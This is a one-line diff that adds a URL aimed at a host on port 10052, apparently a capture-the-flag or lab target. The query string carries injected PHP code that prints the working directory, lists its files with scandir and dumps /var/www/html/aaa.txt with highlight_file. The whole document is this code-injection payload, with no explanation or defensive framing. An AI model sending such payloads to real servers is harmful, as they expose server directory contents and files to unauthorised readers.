@@ -1,0 +1,1 @@
+http://imagin.vip:10052/?a=$con=getcwd();echo $con;$filename = scandir($con);echo " <pre>";print_r($filename);highlight_file( "/var/www/html/aaa.txt");
